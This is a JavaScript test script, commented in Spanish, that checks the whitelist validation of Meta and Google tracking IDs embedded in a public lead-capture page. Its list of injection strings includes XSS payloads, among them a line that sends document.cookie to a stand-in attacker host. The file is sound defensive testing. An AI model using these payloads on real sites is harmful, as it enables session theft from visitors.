/**
 * Verifica la lista blanca de los IDs de seguimiento en el navegador.
 *
 * POR QUÉ EXISTE ESTE ARCHIVO
 * ----------------------------
 * El pixel de Meta, el tag de Google y la etiqueta de conversión terminan
 * escritos DENTRO de un <script> en la vidriera pública: la página donde el
 * cliente deja su nombre y su teléfono. Un ID mal formado ahí adentro es XSS.
 *
 * La validación estaba bien escrita y no tenía un solo test. Nada iba a avisar
 * si la próxima edición la aflojaba. La suite del backend ya cubre su mitad;
 * esto cubre la del navegador, con la misma lista de venenos.
 *
 * No usa ninguna dependencia nueva: transpila `src/lib/seguimiento.ts` con el
 * TypeScript que el proyecto ya tiene y ejecuta el resultado.
 *
 *     npm run check:seguimiento
 */

import { readFileSync } from "node:fs";
import { fileURLToPath, pathToFileURL } from "node:url";
import { dirname, join } from "node:path";
import ts from "typescript";

const raiz = join(dirname(fileURLToPath(import.meta.url)), "..");
const fuente = join(raiz, "src", "lib", "seguimiento.ts");

const js = ts.transpileModule(readFileSync(fuente, "utf8"), {
  compilerOptions: { module: ts.ModuleKind.ESNext, target: ts.ScriptTarget.ES2020 },
}).outputText;

const { META_OK, GOOGLE_OK, LABEL_OK, pixelValido, tagValido, destinoConversion } =
  await import(`data:text/javascript;base64,${Buffer.from(js).toString("base64")}`);

let fallos = 0;
const V = "\x1b[0;32m", R = "\x1b[0;31m", N = "\x1b[0m";

function comprobar(descripcion, condicion) {
  if (condicion) return;
  fallos++;
  console.log(`  ${R}✘${N} ${descripcion}`);
}

// ── Venenos: la misma lista que tests/test_seguimiento_fix018.py ───────────
// Cerrar la comilla e inyectar es EL ataque contra un valor que se escribe
// adentro de un <script>.
const INYECCIONES = [
  "123456');alert(1);//",
  "123456'});fetch('https://malo.com?c='+document.cookie);//",
  "</script><script>alert(1)</script>",
  "123456<img src=x onerror=alert(1)>",
  "123456\\';alert(1);//",
  "123456\nalert(1)",
  "javascript:alert(1)",
];

for (const veneno of INYECCIONES) {
  comprobar(`el pixel no acepta ${JSON.stringify(veneno)}`, pixelValido(veneno) === null);
  comprobar(`el tag no acepta ${JSON.stringify(veneno)}`, tagValido(veneno) === null);
  comprobar(
    `el veneno no llega al send_to como etiqueta: ${JSON.stringify(veneno)}`,
    destinoConversion("AW-123456789", veneno) === null,
  );
  comprobar(
    `el veneno no llega al send_to como tag: ${JSON.stringify(veneno)}`,
    destinoConversion(veneno, "AbC-D_efG") === null,
  );
}

// Formatos que no son un ataque pero tampoco son un ID: si entraran, el
// negocio vería el script cargado y cero datos, sin ninguna pista de por qué.
for (const malo of ["abcdef", "12345", "1".repeat(21), "123 456", "+123456"]) {
  comprobar(`el pixel no acepta ${JSON.stringify(malo)}`, pixelValido(malo) === null);
}
for (const malo of ["XX-1234567", "G-ABC", "G-" + "A".repeat(31), "123456"]) {
  comprobar(`el tag no acepta ${JSON.stringify(malo)}`, tagValido(malo) === null);
}
for (const malo of ["corta", "etiqueta con espacios", "a".repeat(41), "con/barra"]) {
  comprobar(
    `la etiqueta no acepta ${JSON.stringify(malo)}`,
    destinoConversion("AW-123456789", malo) === null,
  );
}

// ── Lo que sí tiene que entrar ─────────────────────────────────────────────
comprobar("un pixel válido pasa", pixelValido("1234567890123456") === "1234567890123456");
comprobar("un tag de Analytics pasa", tagValido("G-ABC1234") === "G-ABC1234");
comprobar("un tag de Ads pasa", tagValido("AW-123456789") === "AW-123456789");
comprobar("se recortan los espacios", pixelValido("  1234567890  ") === "1234567890");
comprobar("vacío es null", pixelValido("") === null && tagValido(null) === null);

// ── El send_to de Google Ads ───────────────────────────────────────────────
comprobar(
  "con tag de Ads y etiqueta se arma el send_to",
  destinoConversion("AW-123456789", "AbC-D_efG-h12") === "AW-123456789/AbC-D_efG-h12",
);
comprobar(
  "SIN etiqueta no se dispara nada (Ads no contaría igual y ensucia la cuenta)",
  destinoConversion("AW-123456789", null) === null,
);
comprobar(
  "con un tag de Analytics no hay conversión de Ads que disparar",
  destinoConversion("G-ABC1234", "AbC-D_efG") === null,
);
comprobar(
  "la etiqueta NO se pasa a mayúsculas (Google las distingue y cambiarlas la rompe)",
  destinoConversion("AW-123456789", "AbC-D_efG") === "AW-123456789/AbC-D_efG",
);

// ── Las listas blancas siguen siendo cerradas ──────────────────────────────
comprobar("la lista blanca del pixel sigue anclada", META_OK.source.startsWith("^") && META_OK.source.endsWith("$"));
comprobar("la lista blanca del tag sigue anclada", GOOGLE_OK.source.startsWith("^") && GOOGLE_OK.source.endsWith("$"));
comprobar("la lista blanca de la etiqueta sigue anclada", LABEL_OK.source.startsWith("^") && LABEL_OK.source.endsWith("$"));

console.log();
if (fallos) {
  console.log(`${R}  ✘ ${fallos} control(es) de seguimiento fallaron${N}`);
  process.exit(1);
}
console.log(`${V}  ✔${N} seguimiento: lista blanca y send_to de Ads verificados`);
